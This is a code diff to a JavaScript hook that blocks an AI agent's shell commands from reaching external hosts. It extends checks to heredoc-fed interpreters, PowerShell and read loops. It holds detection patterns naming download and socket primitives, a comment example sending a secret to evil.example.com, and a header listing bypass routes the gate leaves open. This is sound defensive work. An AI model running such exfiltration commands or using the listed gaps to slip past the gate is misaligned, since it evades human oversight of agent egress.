@@ -32,6 +32,29 @@
 //      assigned VAR); a command word that stays unresolved (any `$` left after expansion except a
 //      `$HOME/` path, `$(...)`, a backtick) followed by an external-looking URL or host argument is denied
 //      (reason `unresolved-command-word`).
+//   4c. (upstream #1669, EGRESSHEREDOC924) a heredoc / here-string that IS an interpreter's program
+//      (`python3 - <<'PY'`, `node <<EOF`, `powershell.exe -Command - <<'PS'`): its body is judged exactly like
+//      a one-liner body (2.); for a shell (bash / sh / zsh / dash / ksh) the body gets the whole analysis, as
+//      if it were the command itself. A heredoc to anything else (`cat <<EOF`, `curl --data-binary @-`) stays
+//      inert text. The stdin of a `while read` loop (here-string or heredoc) binds the read variables the way
+//      a default `read` splits a line, exactly like a `for` word list. PowerShell (powershell / pwsh,
+//      `-Command` in any case or prefix) counts its network cmdlets and aliases as primitives, for
+//      PowerShell bodies only.
+//      SPAWN: an interpreter body that SPAWNS a process (`os.system`, `subprocess`, `execSync`, a backtick ...)
+//      has its embedded curl / wget argv or command line read exactly like a one-liner's (2.): the same
+//      external, unresolved-destination and local / private / vendor rules. See heredocSpawnCheck for the
+//      Python relaxation (a body with no PY_DYNAMIC construct cannot spawn, so a curl in a comment or in a
+//      string it writes passes) and for the line-by-line second reading that an apostrophe cannot defeat.
+//      FALSE-POSITIVE POLICY: a body that uses a network primitive is denied for ANY external URL in it,
+//      even when the call goes to localhost and the URL is only payload or a comment (the one-liner rule,
+//      applied to heredoc bodies). ONE relaxation (upstream maintainers' decision on #1669, 2026-10-06): a
+//      PYTHON heredoc that merely MENTIONS a primitive and a URL in TEXT (the file it writes, a comment) is
+//      not a call and passes. "Text" is decided by reading the program, NFKC-normalised, with its string
+//      literals and comments blanked; the relaxation is OFF, and the old whole-text rule decides, for any
+//      body that can run a string or load code (exec, eval, compile, __import__, importlib, getattr, ...
+//      see PY_DYNAMIC), imports anything outside PY_PLAIN_MODULES, or has an f-string with unbalanced
+//      braces or a string the scan cannot read to its end. node, perl, ruby, php, deno, bun, PowerShell,
+//      bash and -c one-liners are not relaxed.
 //   5. a command that cannot be PARSED (unterminated quote or heredoc) and carries any of the above,
 //      or a URL, is denied (fail closed); an unparseable command with nothing network-capable passes.
 // localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
@@ -56,8 +79,12 @@
 //
 // WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
 // the name-and-shape list will never be complete. Still OPEN: network calls INSIDE a script file
-// (`bash x.sh`, `python3 x.py` -- the hook sees only the outer command); heredoc-fed interpreters
-// (`python3 - <<'PY'`, `bash <<EOF`); a URL or command name built at runtime (concatenation, read
+// (`bash x.sh`, `python3 x.py` -- the hook sees only the outer command); a program that reaches an
+// interpreter through a PIPE or a file rather than a heredoc / here-string attached to the interpreter
+// itself; loop values read from a file, a process substitution or a pipe, `read -a` elements beyond the
+// first, `read` under a non-default IFS, array fillers (mapfile / readarray); a network primitive given
+// a bare host and port with no URL scheme in an interpreter body; encoded or obfuscated code
+// (-EncodedCommand); a URL or command name built at runtime (concatenation, read
 // from a file, the environment, a previous command, a curl -K config, a `$(...)` command word, a
 // computed `exec(...)` string, `curl $(echo https://x)`); an alias or function defined in an EARLIER
 // tool call or in a sourced file (`source x.sh`, `. x.sh`, `export -f`, BASH_ENV, a shell rc file)
@@ -122,13 +149,113 @@ const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
 // binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
 // http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
 const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
-const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)$/
+const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun|powershell(?:\.exe)?|pwsh(?:\.exe)?)$/
 const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
+// PowerShell (WSL reaches the Windows side with powershell.exe): its code flag is -Command (any
+// case, any unambiguous prefix down to -c), and its network primitives are cmdlets and aliases that
+// NET_PRIMITIVE does not name. `curl` / `wget` are listed here ONLY: in PowerShell they are aliases
+// of Invoke-WebRequest, while in a Python body a "curl" word is a subprocess carrying data.
+const POWERSHELL = /^(?:powershell|pwsh)(?:\.exe)?$/i
+const PS_CODE_FLAG = /^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?$/i
+const PS_NET_PRIMITIVE = /\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|curl|wget|Start-BitsTransfer|Net\.WebClient|DownloadString|DownloadFile|Net\.Http\.HttpClient|Net\.Sockets)\b/i
+function hasCodeFlag(cmd, args) {
+  return args.some((w) => CODE_FLAG.has(w) || (POWERSHELL.test(cmd) && PS_CODE_FLAG.test(w)))
+}
+function usesNetwork(cmd, text) {
+  return NET_PRIMITIVE.test(text) || (POWERSHELL.test(cmd) && PS_NET_PRIMITIVE.test(text))
+}
+
+// --- Python heredoc: code versus text (maintainer decision on #1669) --------------------------------
+const PYTHON = /^python(?:\d+(?:\.\d+)?)?$/
+// Valid string prefixes, any case: r, b, u, f, and the two-letter br / rb / fr / rf.
+const PY_STRING_PREFIX = /^(?:[rR][bBfF]?|[bB][rR]?|[uU]|[fF][rR]?)$/
+// Constructs that can turn a string into running code, load code, start a process or open a URL. Read on
+// the program with its literals blanked, so the NAME is what is seen. Never complete, by design: it is the
+// first of two fences, the module allowlist below is the second, and both fall back to the OLD rule.
+const PY_DYNAMIC = new RegExp('\\b(?:exec|eval|compile|__import__|importlib|import_module|getattr|setattr|delattr|globals|locals|vars|' +
+  '__builtins__|builtins|__dict__|__loader__|runpy|subprocess|pty|ctypes|pickle|marshal|timeit|cProfile|profile|pdb|code|codeop|' +
+  'webbrowser|multiprocessing|system|popen|startfile|exec[lv]\\w*|spawn\\w*|fork\\w*|posix_spawn\\w*)\\b')
+// Modules a file-writing script plainly uses. Anything else, a module the heredoc may just have written
+// included, sends the body back to the old whole-text rule.
+const PY_PLAIN_MODULES = new Set(['os', 'sys', 'json', 're', 'pathlib', 'datetime', 'time', 'textwrap', 'shutil', 'csv', 'io',
+  'hashlib', 'base64', 'collections', 'itertools', 'math', 'string', 'tempfile', 'glob', 'argparse', 'html', 'unicodedata', 'uuid',
+  'random', 'statistics', 'zipfile', 'tarfile', 'difflib', 'pprint', 'typing', 'dataclasses', 'functools', 'operator', 'enum', 'fnmatch'])
+// The program with its string literals and comments blanked (newlines kept), or null when the scan cannot
+// vouch for where a string ends. An f-string is NOT blanked: it runs its braces, so its text counts as code.
+export function pythonCodeOnly(text, keepStrings = false) {
+  const out = []
+  const n = text.length
+  let i = 0
+  while (i < n) {
+    const c = text[i]
+    if (c === '#') {
+      let j = text.indexOf('\n', i)
+      if (j === -1) j = n
+      out.push(' '.repeat(j - i)); i = j; continue
+    }
+    if (c !== '"' && c !== "'") { out.push(c); i++; continue }
+    let k = i
+    while (k > 0 && /[A-Za-z0-9_]/.test(text[k - 1])) k--
+    const word = text.slice(k, i)
+    if (word !== '' && !PY_STRING_PREFIX.test(word)) return null   // return"x", ab"x": not a plain literal
+    const triple = text.startsWith(c.repeat(3), i)
+    const delim = triple ? c.repeat(3) : c
+    let j = i + delim.length
+    let closed = false
+    while (j < n) {
+      if (text[j] === '\\') { j += 2; continue }
+      if (text.startsWith(delim, j)) { closed = true; break }
+      if (!triple && text[j] === '\n') return null                // unterminated single-line string
+      j++
+    }
+    if (!closed) return null
+    const body = text.slice(i + delim.length, j)
+    if (/[fF]/.test(word)) {
+      // Brace balance: an unbalanced f-string means this scan ended it where Python (3.12 allows the same
+      // quote inside the braces) did not, and from there on the scan would be blanking real code.
+      const open = (body.match(/\{/g) ?? []).length, close = (body.match(/\}/g) ?? []).length
+      if (open !== close) return null
+      out.push(delim + body + delim)
+    } else {
+      out.push(delim + (keepStrings ? body : body.replace(/[^\n]/g, ' ')) + delim)
+    }
+    i = j + delim.length
+  }
+  return out.join('')
+}
+function pythonImportsPlain(code) {
+  for (const raw of code.split(/[\n;]/)) {
+    const st = raw.trim()
+    if (!/\bimport\b/.test(st)) continue
+    let m
+    if ((m = /^import\s+(.+)$/.exec(st))) {
+      for (const part of m[1].split(',')) if (!PY_PLAIN_MODULES.has(part.trim().split(/\s+/)[0].split('.')[0])) return false
+    } else if ((m = /^from\s+([\w.]+)\s+import\b/.exec(st))) {
+      if (!PY_PLAIN_MODULES.has(m[1].split('.')[0])) return false
+    } else return false                                           // `try: import x`, `x = 1; import` glued forms
+  }
+  return true
+}
+// Does this Python body USE the network, as opposed to MENTION it? Only a primitive in CODE counts, and
+// only when nothing in the body can run a string or load code (see the header).
+function pythonView(text) {
+  // Python reads identifiers as NFKC, so a fullwidth `ｅｘｅｃ(...)` is `exec(...)`: normalize first, or
+  // the fence below does not see it. The fallback rule reads the normalized text too, which is stricter.
+  text = text.normalize('NFKC')
+  const code = pythonCodeOnly(text)
+  // `plain`: the relaxation applies, the body is text that a script writes and cannot run a string,
+  // load code or start a process (PY_DYNAMIC names subprocess, os.system, popen, exec*, spawn* ...).
+  return { text, code, plain: code !== null && !PY_DYNAMIC.test(code) && pythonImportsPlain(code) }
+}
+function pythonUsesNetwork(text) {
+  const v = pythonView(text)
+  return NET_PRIMITIVE.test(v.plain ? v.code : v.text)
+}
 // Shell keywords that can stand before the real command word of a sub-command. They are here
 // because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
 // them a curl inside a loop or an if/then body was never looked at. Commands that WRAP another
 // command (env, sudo, timeout, xargs ...) are in WRAPPERS below, with their flags.
-const PREFIX_WORDS = new Set(['do', 'then', 'else', 'elif', 'if', 'while', 'until', 'coproc', '{', '(', '!'])
+export const PREFIX_WORDS = new Set(['do', 'then', 'else', 'elif', 'if', 'while', 'until', 'coproc', '{', '(', '!'])
 // A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
 // Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
 // inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
@@ -256,7 +383,9 @@ function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
   return Math.min(j + 1, text.length)
 }
 export function liftSubstitutions(text, fill = ' ') {
-  const inners = []; let out = ''; let i = 0
+  // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
+  // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
+  const inners = []; const herestrings = []; let out = ''; let i = 0
   // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
   const lift = (at) => {
     if (text[at] === '$' && text[at + 1] === '(') {
@@ -289,7 +418,7 @@ export function liftSubstitutions(text, fill = ' ') {
     // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
     // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
     // and the word after it is parsed as ordinary (quoted or live) text.
-    if (text.startsWith('<<<', i)) { out += '   '; i += 3; continue }
+    if (text.startsWith('<<<', i)) { herestrings.push(i); out += '   '; i += 3; continue }
     const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
     if (here) {
       const tag = here[1] ?? here[2] ?? here[3]
@@ -300,7 +429,8 @@ export function liftSubstitutions(text, fill = ' ') {
       // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
       // by processing it recursively, then continue with the body
       const lineRest = liftSubstitutions(text.slice(i, nl + 1), fill)
-      out += lineRest.stripped; inners.push(...lineRest.inners); i = nl + 1
+      out += lineRest.stripped; inners.push(...lineRest.inners)
+      herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
       const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
       const rel = endRx.exec(text.slice(i))
       const bodyEnd = rel ? i + rel.index : text.length
@@ -335,7 +465,7 @@ export function liftSubstitutions(text, fill = ' ') {
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners }
+  return { stripped: out, inners, herestrings }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -816,9 +946,103 @@ const NETWORK_TOKEN = new RegExp(
 const SHELL = /^(?:ba|z|da|k|c|tc|fi)?sh$/
 const isCodeFlag = (w) => CODE_FLAG.has(w) || (/^-[A-Za-z]{1,4}$/.test(w) && /[ceEp]$/.test(w))
 const isShellCFlag = (w) => /^-[A-Za-z]*c[A-Za-z]*$/.test(w)
+// EGRESSHEREDOC924: STDIN FEEDS. A heredoc body or a here-string word is what the command on the
+// left reads from stdin. For an interpreter that stdin IS the program (`python3 - <<'PY'`,
+// `node <<EOF`, `bash <<< 'curl ...'`), and for a `while read u` loop it is the list of values `u`
+// takes. maskInertLiterals blanks both (rightly: to the OUTER shell they are text), so before this
+// neither reading was ever judged.
+// `read` options that take a value; -a's value is itself a variable name (an array).
+const READ_OPT_WITH_VALUE = new Set('adnNptui'.split(''))
+// The word after `<<<`, raw (quotes kept), ending at unquoted whitespace or a shell operator.
+function hereStringWord(text, i) {
+  while (i < text.length && (text[i] === ' ' || text[i] === '\t')) i++
+  const s = i
+  while (i < text.length && !/[\s;&|<>()]/.test(text[i])) {
+    if (text[i] === "'") { const e = text.indexOf("'", i + 1); i = e === -1 ? text.length : e + 1; continue }
+    if (text[i] === '"' || (text[i] === '$' && text[i + 1] === "'")) {
+      const q = text[i] === '"' ? '"' : "'"; let j = text[i] === '"' ? i + 1 : i + 2
+      while (j < text.length && text[j] !== q) j += text[j] === '\\' ? 2 : 1
+      i = j + 1; continue
+    }
+    i += text[i] === '\\' ? 2 : 1
+  }
+  return text.slice(s, Math.min(i, text.length))
+}
+// Every feed: { at, text, expands }. `at` is the operator offset (it decides which sub-command the
+// feed belongs to); `expands` is whether the shell expands $VARS in it (unquoted heredoc tag, a
+// here-string word that is not single-quoted).
+function stdinFeeds(orig, masked, herestrings, env) {
+  const feeds = []
+  // Heredoc operators are found in the MASKED text, so one inside quotes or another body is not one.
+  for (const m of masked.matchAll(/<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
+    const tag = m[1] ?? m[2] ?? m[3]
+    const nl = orig.indexOf('\n', m.index + m[0].length)
+    if (nl === -1) continue
+    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
+    const rel = endRx.exec(orig.slice(nl + 1))
+    feeds.push({ at: m.index, text: orig.slice(nl + 1, rel ? nl + 1 + rel.index : orig.length), expands: m[3] != null })
+  }
+  for (const at of herestrings) {
+    const raw = hereStringWord(orig, at + 3)
+    if (!raw) continue
+    const expands = !raw.startsWith("'")
+    feeds.push({ at, text: shellWords(expands ? expand(raw, env) : raw).join(' '), expands: false })
+  }
+  return feeds
+}
+// The command word of the sub-command that contains offset `at` (basename, prefixes skipped).
+function commandWordAt(masked, at) {
+  for (const [a, b] of spans(masked)) {
+    if (at < a || at > b) continue
+    // FORK: commandIndex returns the word list it read (an env -S value is spliced in) and -1 when
+    // nothing is left to run (a wrapper without an operand).
+    const { ow, k } = commandIndex(words(masked.slice(a, b)))
+    return k === -1 ? null : ow[k].split('/').pop()
+  }
+  return null
+}
+// Every `read` in the command, as { names, array }: `while IFS= read -r a b` -> names [a, b];
+// `read -a arr` -> array arr; a bare `read` -> names [REPLY].
+function collectReads(orig, masked) {
+  const reads = []
+  for (const [a, b] of spans(masked)) {
+    // FORK: `while` / `until` are in PREFIX_WORDS, so commandIndex already stands on the `read`.
+    const { ow: sw, k: k0 } = commandIndex(shellWords(orig.slice(a, b)))
+    let k = k0
+    if (k === -1 || sw[k] !== 'read') continue
+    const names = []; let array = null
+    for (k++; k < sw.length; k++) {
+      const w = sw[k]
+      if (w.startsWith('-') && w.length > 1) {
+        for (let q = 1; q < w.length; q++) {
+          if (!READ_OPT_WITH_VALUE.has(w[q])) continue
+          const v = q + 1 < w.length ? w.slice(q + 1) : sw[++k]
+          if (w[q] === 'a' && /^[A-Za-z_]\w*$/.test(v ?? '')) array = v
+          break
+        }
+        continue
+      }
+      if (/^[A-Za-z_]\w*$/.test(w)) names.push(w); else break
+    }
+    reads.push({ names: names.length || array ? names : ['REPLY'], array })
+  }
+  return reads
+}
+// The values one `read` gives its variables from a fed text, line by line, the way read splits a
+// line: field k to the k-th name, the rest of the line to the last name, every field to an array.
+function readValues(text, { names, array }) {
+  const out = {}
+  const add = (v, x) => { if (x) (out[v] ??= []).push(x) }
+  for (const line of text.split('\n')) {
+    const f = line.trim().split(/\s+/).filter(Boolean)
+    names.forEach((v, k) => add(v, k < names.length - 1 ? f[k] : f.slice(k).join(' ')))
+    if (array) for (const x of f) add(array, x)
+  }
+  return out
+}
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
-  const { stripped: orig, inners } = liftSubstitutions(norm)
+  const { stripped: orig, inners, herestrings } = liftSubstitutions(norm)
   if (depth < 4) {
     for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
   }
@@ -831,6 +1055,45 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   const loops = collectLoops(orig, masked, env)
   const external = (hosts) => [...new Set(hosts)].filter((h) => !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
   const isExt = (h) => external([h]).length > 0
+  // EGRESSHEREDOC924 (upstream #1669), ported into the fork's structure. A `while read u; do ...; done
+  // <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to the fed lines in the same command,
+  // exactly like `for u in URL`: the values join the loop values.
+  const feeds = stdinFeeds(orig, masked, herestrings, env)
+  const reads = collectReads(orig, masked)
+  for (const f of reads.length ? feeds : []) {
+    const c = commandWordAt(masked, f.at)
+    if (c !== 'done' && c !== 'read') continue
+    const text = f.expands ? expand(f.text, env) : f.text
+    for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
+  }
+  // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
+  // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
+  // shell interpreter's body is a command line of its own, so it gets the whole analysis.
+  const externalHosts = (hosts) => [...new Set(hosts)].filter((h) => !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
+  for (const f of feeds) {
+    const cmd = commandWordAt(masked, f.at)
+    const shell = cmd !== null && SHELL.test(cmd)
+    if (!shell && !(cmd !== null && INTERPRETER.test(cmd.toLowerCase()))) continue
+    const plain = f.expands ? expand(f.text, env) : f.text
+    const variants = f.expands ? loopVariants(f.text, env, loops) : []
+    for (const text of [plain, ...(variants ?? [])]) {
+      if (shell) {
+        if (depth >= 4) break
+        const r = classify(text, depth + 1, vendorHosts, vendorDomains)
+        if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
+        continue
+      }
+      if (PYTHON.test(cmd.toLowerCase()) ? pythonUsesNetwork(text) : usesNetwork(cmd, text)) {
+        const found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
+        const hosts = externalHosts(found)
+        if (hosts.length) return { deny: true, reason: 'heredoc-external', hosts }
+      }
+      // A body that spawns curl / wget (os.system, subprocess, child_process ...): the one-liner rule.
+      const r = heredocSpawnCheck(cmd, text, depth, vendorHosts, vendorDomains)
+      if (r) return { ...r, reason: `heredoc-${r.reason}` }
+    }
+    if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
+  }
   const aliases = collectAliases(orig, masked, env)
   const funcs = collectFunctions(orig, masked)
   const inHeader = (a, b) => [...funcs.values()].some((f) => a >= f.head[0] && b <= f.head[1])
@@ -923,11 +1186,11 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
           found.push(...[...rest[j + 1].matchAll(URL_RE)].map((m) => hostOf(m[0])).filter(Boolean))
           const r = embeddedCheck(rest[j + 1], depth, vendorHosts, vendorDomains); if (r) return r
         }
-      } else if (INTERPRETER.test(cmd)) {
-        const ci = rest.findIndex(isCodeFlag)
+      } else if (INTERPRETER.test(cmd.toLowerCase())) {
+        const ci = rest.findIndex((w) => isCodeFlag(w) || (POWERSHELL.test(cmd) && PS_CODE_FLAG.test(w)))
         if (ci !== -1) {
           // An interpreter one-liner has no argv to read, so its code is scanned with URL_RE ...
-          if (NET_PRIMITIVE.test(text)) { target = 'one-liner'; found = [...text.matchAll(URL_RE)].map((m) => hostOf(m[0])).filter(Boolean) }
+          if (usesNetwork(cmd, text)) { target = 'one-liner'; found = [...text.matchAll(URL_RE)].map((m) => hostOf(m[0])).filter(Boolean) }
           // ... and when it spawns a process, the curl / wget argv inside it is read.
           if (SPAWN_PRIMITIVE.test(rest[ci + 1] ?? '')) { const r = embeddedCheck(rest[ci + 1], depth, vendorHosts, vendorDomains); if (r) return r }
         }
@@ -943,11 +1206,55 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   return { deny: false, reason: null, hosts: [] }
 }
 
+// A heredoc / here-string that is an interpreter's program and SPAWNS a process is read the way a
+// one-liner is: the curl / wget argv or command line inside `os.system(...)`, `subprocess.run([...])`,
+// `execSync(...)`, a backtick, is judged (embeddedCheck), not only the language's own network API. The
+// body of a heredoc is a whole program, so it is read more carefully than a one-liner can be:
+//  - Python: the relaxation of 4c holds. A body whose code (comments and string literals blanked) has no
+//    PY_DYNAMIC construct cannot start a process, so a `curl` or `os.system("curl ...")` that is only
+//    TEXT (a comment, a string that is written to a file) passes, as before. Any other body is read on
+//    the text with its comments blanked AND on the raw text (the raw text can only add a deny).
+//  - node, perl, ruby, php, deno, bun, PowerShell: no relaxation, as for their network API.
+//  - the string literals are paired by a plain quote scan, which an apostrophe in a comment or prose throws
+//    off for the rest of the body. So the body is also read LINE BY LINE (only lines that name a tool): a
+//    desynchronised pairing can then hide nothing on a one-line call. An argv list split over several
+//    lines is read on the whole body only. Pinned as open in the tests.
+const TOOL_LINE = new RegExp(TOOL_ALT)
+function heredocSpawnCheck(cmd, text, depth, vendorHosts, vendorDomains) {
+  let views = [text]
+  if (PYTHON.test(cmd.toLowerCase())) {
+    const v = pythonView(text)
+    if (v.plain) return null
+    views = [v.text]
+    const noComments = pythonCodeOnly(v.text, true)
+    if (noComments !== null && noComments !== v.text) views.push(noComments)
+  }
+  for (const view of views) {
+    if (!SPAWN_PRIMITIVE.test(view)) continue
+    const lines = view.split('\n')
+    const chunks = lines.length > 1 ? [view, ...lines.filter((l) => TOOL_LINE.test(l))] : [view]
+    for (const chunk of chunks) { const r = embeddedCheck(chunk, depth, vendorHosts, vendorDomains); if (r) return r }
+  }
+  return null
+}
+
 const GATE_MSG =
   'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl, wget, nc, socat, telnet, ftp, httpie es ' +
   'tarsaik vagy interpreter-egysoros kulso celra, akkor is, ha a cel valtozoban van. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
   '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
   'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
+// A heredoc / here-string body or a read loop that carries an external URL is denied even when the call
+// goes to localhost and the URL is only text in the payload (the one-liner rule, see 4c in the header).
+// The way out for a dashboard call is the wrapper, which sends its body as data and never runs an
+// interpreter heredoc: say so in the deny, so the agent takes the sanctioned path instead of retrying.
+const WRAPPER_HINT =
+  ' Ha ez egy dashboard-hivas (localhost), amely kulso URL-t csak idez a szovegben (pl. PR-link egy uzenetben): ' +
+  'ne interpreter-heredocbol kuldd, hanem a wrapperrel: bash scripts/agent-api.sh [--agent <nev>] POST /api/... \'<json>\' ' +
+  '(a torzs adat, nem futtatott kod).'
+export function denyMessage(r) {
+  const base = `${GATE_MSG} (hoszt: ${(r.hosts ?? []).join(', ')})`
+  return typeof r.reason === 'string' && r.reason.startsWith('heredoc-') ? base + WRAPPER_HINT : base
+}
 function isInvokedDirectly() {
   try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
 }
@@ -962,7 +1269,7 @@ if (isInvokedDirectly()) {
       mkdirSync(dirname(BLOCK_LOG), { recursive: true })
       appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), reason: r.reason, hosts: r.hosts }) + '\n')
     } catch { /* the deny still stands; a log failure must not turn it into an allow */ }
-    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `${GATE_MSG} (hoszt: ${r.hosts.join(', ')})` } }))
+    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: denyMessage(r) } }))
   }
   process.exit(0)
 }
